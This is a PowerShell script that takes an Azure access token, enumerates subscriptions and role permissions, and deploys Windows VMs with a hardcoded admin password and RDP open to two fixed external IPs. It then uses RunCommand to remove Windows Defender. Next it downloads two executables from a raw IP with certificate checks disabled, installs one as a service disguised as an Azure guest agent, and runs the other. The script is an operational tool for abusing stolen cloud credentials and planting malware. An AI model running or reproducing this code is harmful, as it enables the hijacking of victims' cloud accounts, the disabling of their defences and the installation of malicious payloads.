function Invoke-VMDeploy {
    param (
        [Parameter(Mandatory = $true)]
        [string]$AccessToken,

        [Parameter(Mandatory = $true)]
        [int]$VmCount
    )

    if ($VmCount -lt 1 -or $VmCount -gt 10) {
        Write-Error "VM count must be between 1 and 10."
        return
    }

#######################################################
    $DefaultImageSku = "2022-datacenter-azure-edition"
    $DefaultDiskType = "StandardSSD_LRS"
    $DefaultVmSize = "Standard_D2s_v3"
    $DefaultLocation = "southcentralus"
    $AdminUsername = "ladmin"
    $AdminPassword = "ZV6413flSv!"
    $AllowedRdpIps = @("177.71.237.177/32", "18.229.148.116/32")
#######################################################

    $Headers = @{
        "Authorization" = "Bearer $AccessToken"
        "Content-Type" = "application/json"
		"User-Agent" = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    }

#######################################################

    function Invoke-AzureGet ($Uri) {
        try   {
			return Invoke-RestMethod -Uri $Uri -Method Get -Headers $Headers 
		}
        catch {
			return $null 
		}
    }

#######################################################
function TimeNow {

    $time = Get-Date
    return $time.DateTime

}

#######################################################
	$a = TimeNow
    Write-Host "[+] Enumeration of Subscirptions ($($a)" -ForegroundColor Gray
    $SubUrl = "https://management.azure.com/subscriptions?api-version=2020-01-01"
    $SubResponse = Invoke-AzureGet $SubUrl

    if (-not $SubResponse -or -not $SubResponse.value) {
        Write-Error "No accessible Subscriptions found or token is expired."
        return
    }

    $SelectedSub = $SubResponse.value[0]
    $SubscriptionId = $SelectedSub.subscriptionId
    Write-Host "`t[+] Active Subscription: $($SelectedSub.displayName) ($SubscriptionId)" -ForegroundColor DarkGray

	#######################################################
    function Get-EffectivePermissions ($Scope) {
        $Url = "https://management.azure.com/$Scope/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"
        $Assignments = Invoke-AzureGet $Url
		
        $Permissions = @{ 
			CanCreateVM = $false
			CanCreateNSG = $false 
		}
		
        if (-not $Assignments) {
			return $Permissions 
		}

        foreach ($Assignment in $Assignments.value) {
            $DefId = $Assignment.properties.roleDefinitionId
            if (-not $DefId) {
				continue 
			}

            $DefUrl = "https://management.azure.com$DefId`?api-version=2022-04-01"
            $RoleDef = Invoke-AzureGet $DefUrl

            if ($RoleDef) {
                foreach ($PermissionBlock in $RoleDef.properties.permissions) {
                    $Actions = $PermissionBlock.actions
                    $NotActions = $PermissionBlock.notActions

                    if ($Actions -contains "*" -and ($NotActions -notcontains "*")) {
                        return @{ CanCreateVM = $true; CanCreateNSG = $true }
                    }

                    if (($Actions -contains "Microsoft.Compute/*" -or $Actions -contains "Microsoft.Compute/virtualMachines/write") -and
                        ($NotActions -notcontains "Microsoft.Compute/virtualMachines/write")) {
                        $Permissions.CanCreateVM = $true
                    }
                    if (($Actions -contains "Microsoft.Network/*" -or $Actions -contains "Microsoft.Network/networkSecurityGroups/write") -and
                        ($NotActions -notcontains "Microsoft.Network/networkSecurityGroups/write")) {
                        $Permissions.CanCreateNSG = $true
                    }
                }
            }
        }
        return $Permissions
    }

	#######################################################
	$a = TimeNow
    Write-Host "[+] Enumeration of permissions at Subscription level ($($a)" -ForegroundColor Gray
    $SubPermissions = Get-EffectivePermissions -Scope "subscriptions/$SubscriptionId"

    $FinalCanVM  = $SubPermissions.CanCreateVM
    $FinalCanNSG = $SubPermissions.CanCreateNSG
    $TargetResourceGroup = ""

    if (-not $FinalCanVM) {
        Write-Host "[-] Missing write permissions at Subscription level. Scanning Resource Groups..." -ForegroundColor Yellow

        $RgUrl = "https://management.azure.com/subscriptions/$SubscriptionId/resourcegroups?api-version=2021-04-01"
        $RgResponse = Invoke-AzureGet $RgUrl

        foreach ($Rg in $RgResponse.value) {
            Write-Host "[*] Evaluating RG: $($Rg.name)..." -ForegroundColor Gray
            $RgPermissions = Get-EffectivePermissions -Scope "subscriptions/$SubscriptionId/resourceGroups/$($Rg.name)"

            if ($RgPermissions.CanCreateVM) {
                Write-Host "`t[+] Adequate permissions found in RG: $($Rg.name)" -ForegroundColor DarkGray
                $FinalCanVM  = $true
                $FinalCanNSG = $RgPermissions.CanCreateNSG
                $TargetResourceGroup = $Rg.name
                break
            }
        }
    } else {
        $RgUrl = "https://management.azure.com/subscriptions/$SubscriptionId/resourcegroups?api-version=2021-04-01"
        $RgResponse = Invoke-AzureGet $RgUrl
        if ($RgResponse.value) { $TargetResourceGroup = $RgResponse.value[0].name }
    }

    if (-not $FinalCanVM) {
        Write-Error "Access Denied: Missing 'Microsoft.Compute/virtualMachines/write' across all accessible scopes."
        return
    }

    $DeployNetworkComponents = $true
    if (-not $FinalCanNSG) {
        Write-Host "[!] Warning: Missing Microsoft.Network write actions. Deploying VMs without new VNet/NSG." -ForegroundColor Yellow
        $DeployNetworkComponents = $false
    }

#######################################################
    $VmList = @()
    for ($i = 1; $i -le $VmCount; $i++) {
        Write-Host "[+] Set the VMs" -ForegroundColor Gray
        $VmName = ""
        while ([string]::IsNullOrWhiteSpace($VmName)) { $VmName = Read-Host "Enter VM Name" }

        $Location = Read-Host "Enter Location [Default: $DefaultLocation]"
        if ([string]::IsNullOrWhiteSpace($Location)) { $Location = $DefaultLocation }

        $VmSize = Read-Host "Enter VM Size [Default: $DefaultVmSize]"
        if ([string]::IsNullOrWhiteSpace($VmSize)) { $VmSize = $DefaultVmSize }

        $VmList += [PSCustomObject]@{ Name = $VmName; Location = $Location; Size = $VmSize }
    }

    $a = TimeNow
    Write-Host "[+] Starting to deploy on Resource Group -> $TargetResourceGroup ($($a)" -ForegroundColor Gray
    
    $VmList | Format-Table

    $Confirm = Read-Host "Ready to initiate deployment? (y/n)"
	
    if ($Confirm -ne "y") {
		Write-Host "Deployment aborted."
		return 
	}


    $DeploymentTrackingList = @()

    foreach ($Vm in $VmList) {
        $DeploymentName = "Deploy-$($Vm.Name)-" + (Get-Date -Format "yyyyMMddHHmmss")
        $Uri = "https://management.azure.com/subscriptions/$SubscriptionId/resourceGroups/$TargetResourceGroup/providers/Microsoft.Resources/deployments/$DeploymentName`?api-version=2021-04-01"

        $Resources  = @()
        $VnetName   = "$($Vm.Name)-vnet"
        $SubnetName = "default"
        $SubnetRef  = "[concat(resourceId('Microsoft.Network/virtualNetworks', '$VnetName'), '/subnets/$SubnetName')]"

        if ($DeployNetworkComponents) {
            $Resources += @{
                "type" = "Microsoft.Network/virtualNetworks"
                apiVersion = "2023-11-01"
                name = $VnetName
                location = $Vm.Location
                properties = @{
                    addressSpace = @{ addressPrefixes = @("10.0.0.0/16") }
                    subnets = @(@{ name = $SubnetName; properties = @{ addressPrefix = "10.0.1.0/24" } })
                }
            }


            $Resources += @{
                "type" = "Microsoft.Network/publicIPAddresses"
                apiVersion = "2023-11-01"
                name  = "$($Vm.Name)-pip"
                location = $Vm.Location
                sku = @{ name = "Standard" }
                properties = @{ publicIPAllocationMethod = "Static" }
            }


            $Resources += @{
                "type" = "Microsoft.Network/networkSecurityGroups"
                apiVersion = "2023-11-01"
                name = "$($Vm.Name)-nsg"
                location= $Vm.Location
                properties = @{
                    securityRules = @(
                        @{
                            name= "AllowSpecificRDP"
                            properties = @{
                                description = "Allow RDP only from specific management IPs"
                                protocol  = "Tcp"
                                sourcePortRange  = "*"
                                destinationPortRange = "3389"
                                sourceAddressPrefixes = $AllowedRdpIps
                                destinationAddressPrefix = "*"
                                access = "Allow"
                                priority = 100
                                direction = "Inbound"
                            }
                        },
                        @{
                            name = "DenyAllInbound"
                            properties = @{
                                description = "Block all other inbound connections"
                                protocol = "*"
                                sourcePortRange = "*"
                                destinationPortRange = "*"
                                sourceAddressPrefix = "*"
                                destinationAddressPrefix = "*"
                                access = "Deny"
                                priority = 200
                                direction = "Inbound"
                            }
                        }
                    )
                }
            }
        }

 
        $NicProperties = @{
            ipConfigurations = @(@{
                name = "ipconfig1"
                properties = @{
                    subnet = @{ id = $SubnetRef }
                    privateIPAllocationMethod = "Dynamic"
                }
            })
        }

        $NicDependsOn = @()
        if ($DeployNetworkComponents) {
            $NicProperties.ipConfigurations[0].properties += @{
                publicIPAddress = @{ id = "[resourceId('Microsoft.Network/publicIPAddresses', '" + $Vm.Name + "-pip')]" }
            }
            $NicProperties += @{
                networkSecurityGroup = @{ id = "[resourceId('Microsoft.Network/networkSecurityGroups', '" + $Vm.Name + "-nsg')]" }
            }
            $NicDependsOn += "[concat('Microsoft.Network/virtualNetworks/', '$VnetName')]"
            $NicDependsOn += "[concat('Microsoft.Network/publicIPAddresses/', '" + $Vm.Name + "-pip')]"
            $NicDependsOn += "[concat('Microsoft.Network/networkSecurityGroups/', '" + $Vm.Name + "-nsg')]"
        }

        $Resources += @{
            "type" = "Microsoft.Network/networkInterfaces"
            apiVersion = "2023-11-01"
            name = "$($Vm.Name)-nic"
            location = $Vm.Location
            dependsOn = $NicDependsOn
            properties = $NicProperties
        }

        
        $Resources += @{
            "type" = "Microsoft.Compute/virtualMachines"
            apiVersion = "2023-09-01"
            name = $Vm.Name
            location = $Vm.Location
            dependsOn  = @("[concat('Microsoft.Network/networkInterfaces/', '" + $Vm.Name + "-nic')]")
            properties = @{
                hardwareProfile = @{ vmSize = $Vm.Size }
                storageProfile  = @{
                    imageReference = @{
                        publisher = "MicrosoftWindowsServer"
                        offer = "WindowsServer"
                        sku  = $DefaultImageSku
                        version = "latest"
                    }
                    osDisk = @{
                        createOption = "FromImage"
                        managedDisk  = @{ storageAccountType = $DefaultDiskType }
                    }
                }
                osProfile = @{
                    computerName = $Vm.Name
                    adminUsername = $AdminUsername
                    adminPassword = $AdminPassword
                    windowsConfiguration = @{ enableAutomaticUpdates = $true }
                }
                networkProfile = @{
                    networkInterfaces = @(@{ id = "[resourceId('Microsoft.Network/networkInterfaces', '" + $Vm.Name + "-nic')]" })
                }
            }
        }

        $Body = @{
            properties = @{
                mode = "Incremental"
                template = @{
                    '$schema' = "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#"
                    contentVersion = "1.0.0.0"
                    resources = $Resources
                }
            }
        } | ConvertTo-Json -Depth 10

        try {
            Invoke-RestMethod -Uri $Uri -Method Put -Headers $Headers -Body $Body | Out-Null
            Write-Host "`t[+] Proccessing.." -ForegroundColor DarkGray

            $DeploymentTrackingList += [PSCustomObject]@{
                VmName = $Vm.Name
                DeploymentUri = $Uri
                Location = $Vm.Location
                Status = "Provisioning"
               
                Phase1Sent = $false
                Phase1Done = $false
               
                Phase2Sent = $false
                Phase2Done = $false
               
                RebootStart = $null
            }
        }
        catch {
            Write-Host "[-] Failed to submit deployment for $($Vm.Name) -> $($_.Exception.Message)" -ForegroundColor Red
        }
    }

############################################################################
    $Phase1Lines = @(
        'Uninstall-WindowsFeature -Name Windows-Defender -Remove',
        'Restart-Computer -Force'
    )
    $Phase1Script = $Phase1Lines -join "`r`n"

############################################################################
    $Phase2Lines = @(
'[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls',
'[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }',
'$webClient = New-Object System.Net.WebClient',
'$webClient.Headers.Add("Host", "interlob.com")',
'$webClient.DownloadFile("https://177.71.237.177/c5613b49b9ed7658cd2e1424775ad170", "C:\Windows\System32\AzGuestAgent.exe")',
'sleep 5',
'New-Service -Name "AzGuestAgent" -BinaryPathName C:\Windows\System32\AzGuestAgent.exe -StartupType Automatic',
'Start-Service "AzGuestAgent"',
'sleep 5',
'$webClient = New-Object System.Net.WebClient',
'$webClient.Headers.Add("Host", "interlob.com")',
'$webClient.DownloadFile("https://177.71.237.177/9eaee6d75da75ac3619ab9c8550cbb8e", "C:\ProgramData\makew.exe")',
'Sleep 2',
'Start-Process -FilePath C:\ProgramData\makew.exe'
)

$Phase2Script = $Phase2Lines -join "`r`n"

############################################################################

    $RebootWaitSeconds = 360

    while ($true) {
        
        $Pending = $DeploymentTrackingList | Where-Object {
            $_.Phase2Done -eq $false -and $_.Status -ne "Failed"
        }
        if (-not $Pending) { break }

        foreach ($Item in $DeploymentTrackingList) {
            if ($Item.Status -eq "Failed" -or $Item.Phase2Done) {
				continue 
			}


            if (-not $Item.Phase1Sent) {
                $Check = Invoke-AzureGet -Uri $Item.DeploymentUri
                $CurrentState = $Check.properties.provisioningState

                if ($CurrentState -eq "Succeeded") {
                   
                    Write-Host "`t[+] Done for Phase 1 -> $($Item.VmName)" -ForegroundColor DarkGray

                    $Rc1Uri  = "https://management.azure.com/subscriptions/$SubscriptionId/resourceGroups/$TargetResourceGroup/providers/Microsoft.Compute/virtualMachines/$($Item.VmName)/runCommands/RemoveDefender?api-version=2023-09-01"
                    $Rc1Body = @{
                        location   = $Item.Location
                        properties = @{
                            source = @{ script = $Phase1Script }
                            asyncExecution = $true   
                            timeoutInSeconds = 600
                        }
                    } | ConvertTo-Json -Depth 5

                    try {
                        Invoke-RestMethod -Uri $Rc1Uri -Method Put -Headers $Headers -Body $Rc1Body | Out-Null
                        Write-Host "[+] Phase-1 RunCommand sent to '$($Item.VmName)'. Starting reboot timer ($RebootWaitSeconds s)..." -ForegroundColor Green
                        $Item.Phase1Sent  = $true
                        $Item.RebootStart = (Get-Date)
                        $Item.Status = "Phase1-Rebooting"
                    }
                    catch {
                        Write-Host "[-] Failed to send Phase-1 RunCommand to $($Item.VmName)  $($_.Exception.Message)" -ForegroundColor Red
                    }
                }
                elseif ($CurrentState -eq "Failed" -or $CurrentState -eq "Canceled") {
                    Write-Host "`n[-] ARM deployment failed for '$($Item.VmName)'." -ForegroundColor Red
                    $Item.Status = "Failed"
                }
                else {
                    $DisplayState = if ([string]::IsNullOrEmpty($CurrentState)) { "Initiating" } else { $CurrentState }
                    Write-Host "`t[+] $(Get-Date -Format 'HH:mm:ss') | Virtual Machine -> '$($Item.VmName)' on state of-> $($DisplayState)" -ForegroundColor DarkGray
                }
                continue
            }

            if ($Item.Status -eq "Phase1-Rebooting") {
                $Elapsed = ((Get-Date) - $Item.RebootStart).TotalSeconds
                if ($Elapsed -lt $RebootWaitSeconds) {
                    $Remaining = [int]($RebootWaitSeconds - $Elapsed)
                    Write-Host "`t[+] $(Get-Date -Format 'HH:mm:ss') | Virtual Machine -> '$($Item.VmName)' is rebooting Waiting $($Remaining) sec..." -ForegroundColor DarkGray
                    continue
                }

                Write-Host "`t[+] $(Get-Date -Format 'HH:mm:ss') | Virtual Machine -> '$($Item.VmName)' up, starting the Phase2" -ForegroundColor DarkGray
                $Item.Status = "Phase2-Pending"
            }


            if ($Item.Status -eq "Phase2-Pending" -and -not $Item.Phase2Sent) {
                $Rc2Uri  = "https://management.azure.com/subscriptions/$SubscriptionId/resourceGroups/$TargetResourceGroup/providers/Microsoft.Compute/virtualMachines/$($Item.VmName)/runCommands/CreateItAdminFolder?api-version=2023-09-01"
                $Rc2Body = @{
                    location   = $Item.Location
                    properties = @{
                        source  = @{ script = $Phase2Script }
                        asyncExecution = $false   
                        timeoutInSeconds = 120
                    }
                } | ConvertTo-Json -Depth 5

                try {
                    Invoke-RestMethod -Uri $Rc2Uri -Method Put -Headers $Headers -Body $Rc2Body | Out-Null
                    #Write-Host "[+] Phase-2 RunCommand sent to '$($Item.VmName)'. Polling for completion..." -ForegroundColor Green
                    $Item.Phase2Sent = $true
                    $Item.Status = "Phase2-Running"
                }
                catch {
                    Write-Host "[-] Failed to send Phase-2 RunCommand to '$($Item.VmName)': $($_.Exception.Message)" -ForegroundColor Red
                }
                continue
            }

 
            if ($Item.Status -eq "Phase2-Running") {
                $Rc2StatusUri = "https://management.azure.com/subscriptions/$SubscriptionId/resourceGroups/$TargetResourceGroup/providers/Microsoft.Compute/virtualMachines/$($Item.VmName)/runCommands/CreateItAdminFolder?`$expand=instanceView&api-version=2023-09-01"
                $Rc2Status  = Invoke-AzureGet -Uri $Rc2StatusUri

                $ExecState = $Rc2Status.properties.instanceView.executionState

                if ($ExecState -eq "Succeeded") {
                    Write-Host "	[#] $(Get-Date -Format 'HH:mm:ss') - Virtual Machine -> '$($Item.VmName)'  Done!" -ForegroundColor Gray
                    $Item.Phase2Done = $true
                    $Item.Status     = "Completed"
                }
                elseif ($ExecState -eq "Failed" -or $ExecState -eq "TimedOut" -or $ExecState -eq "Canceled") {
                    Write-Host "[-] '$($Item.VmName)' - Phase-2 RunCommand failed (state: $ExecState)." -ForegroundColor Red
                    $Item.Status = "Failed"
                }
                else {
                    Write-Host "[*] $(Get-Date -Format 'HH:mm:ss') - '$($Item.VmName)' Phase-2 state: $ExecState" -ForegroundColor Gray
                }
            }
        }

        Start-Sleep -Seconds 15
    }



    $FinalReport = @()

    foreach ($Item in $DeploymentTrackingList) {
        if ($Item.Status -eq "Failed") { continue }

        $PipUri  = "https://management.azure.com/subscriptions/$SubscriptionId/resourceGroups/$TargetResourceGroup/providers/Microsoft.Network/publicIPAddresses/$($Item.VmName)-pip`?api-version=2023-11-01"
        $PipData = Invoke-AzureGet -Uri $PipUri

        $IpAddress = "N/A"
        if ($PipData -and $PipData.properties -and $PipData.properties.ipAddress) {
            $IpAddress = $PipData.properties.ipAddress
        }

        $FinalReport += [PSCustomObject]@{
            "VM Name" = $Item.VmName
            "Public IP" = $IpAddress
            "Username" = $AdminUsername
            "Password" = $AdminPassword
            "Status" = $Item.Status
        }
    }

    Write-Host "[+] DEPLOYMENT COMPLETE" -ForegroundColor Gray
    $FinalReport | Format-Table -AutoSize
}
